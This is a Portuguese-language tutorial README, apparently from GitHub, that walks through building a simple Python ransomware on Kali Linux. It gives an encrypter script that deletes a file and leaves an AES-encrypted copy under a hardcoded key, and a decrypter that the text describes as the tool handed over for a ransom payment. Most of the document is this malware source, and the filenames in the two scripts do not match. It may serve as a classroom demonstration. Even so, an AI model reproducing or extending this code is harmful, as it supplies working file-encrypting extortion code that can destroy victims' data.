# Criando-um-Ransomware-com-python

Ferramentas necessárias para criação deste ransomware

Kali Linux
vim

Configuração Ransomware

No terminal do Kali Linux, crie um arquivo que servirá de exemplo para o ataque: vim dados_teste.txt 
Dentro do arquivo dados_teste.txt, adicione um dado como: "Dados importantes da minha empresa." 
Agora, crie um comando em Python para criptografar o arquivo dados_teste.txt: vim encrypter.py

Alimente com esses dados:

Fazer um arquivo em phyton para cryptografar o arquivo dados_teste.txt: vim encrypter.py

import os         # Importa o módulo 'os' para interagir com o sistema operacional.
import pyaes      # Importa a biblioteca 'pyaes' para operações de criptografia e descriptografia.

# Abrir o arquivo a ser criptografado
file_name = 'dados_teste.txt'                # Define o nome do arquivo a ser criptografado.
file = open(file_name, "rb")                 # Abre o arquivo em modo de leitura binária.
file_data = file.read()                      # Lê o conteúdo do arquivo e armazena em 'file_data'.
file.close()                                 # Fecha o arquivo.

# Remover o arquivo original
os.remove(file_name)                         # Remove o arquivo original do sistema.

# Chave de criptografia
key = b'testeransomwares'                     # Define a chave de criptografia.
aes = pyaes.AESModeOfOperationCTR(key)        # Cria um objeto AES para criptografia no modo CTR.

# Criptografar o arquivo
crypto_data = aes.encrypt(file_data)          # Criptografa os dados do arquivo.

# Salvar o arquivo criptografado
new_file = file_name + '.ransomwarattack'     # Define o nome do novo arquivo criptografado.
new_file = open(f'{new_file}', 'wb')          # Abre o novo arquivo em modo de escrita binária.
new_file.write(crypto_data)                   # Escreve os dados criptografados no novo arquivo.
new_file.close()                              # Fecha o novo arquivo.

Agora, crie um arquivo para descriptografar, que o atacante forneceria para quem sofreu o ataque mediante o pagamento do resgate: vim decrypter.py

import os        # Importa o módulo 'os' para interagir com o sistema operacional.
import pyaes     # Importa a biblioteca 'pyaes' para operações de criptografia e descriptografia.

# Abrir o arquivo criptografado
file_name = 'teste.txt.ransomwarattack'        # Define o nome do arquivo criptografado.
file = open(file_name, 'rb')                   # Abre o arquivo em modo de leitura binária.
file_data = file.read()                        # Lê o conteúdo do arquivo e armazena em 'file_data'.
file.close()                                   # Fecha o arquivo.

# Chave para descriptografia
key = b'testeransomwares'                      # Define a chave de descriptografia.
aes = pyaes.AESModeOfOperationCTR(key)         # Cria um objeto AES para descriptografia no modo CTR.
decrypt_data = aes.decrypt(file_data)          # Descriptografa os dados do arquivo.

# Remover o arquivo criptografado
os.remove(file_name)                           # Remove o arquivo criptografado do sistema.

# Criar o arquivo descriptografado
new_file = 'dados_teste.txt'                   # Define o nome do novo arquivo descriptografado.
new_file = open(f'{new_file}', 'wb')           # Abre o novo arquivo em modo de escrita binária.
new_file.write(decrypt_data)                   # Escreve os dados descriptografados no novo arquivo.
new_file.close()                               # Fecha o novo arquivo.

Comandos para fazer a cryptografia e a descryptografia no terminal kali:

Instalado no módulo pyaes no seu ambiente Python: pip install pyaes
Para criptografar o arquivo dados_teste.txt: python encrypter.py
Para descryptografar o arquivo dados_teste.txt: 

![Dados_criptografado](https://github.com/user-attachments/assets/e6da0098-7422-4eb3-afc9-8f6a2c80c331)
![Dados_descriptografado](https://github.com/user-attachments/assets/8d874905-c80a-4870-9f73-31a55af87ec4)


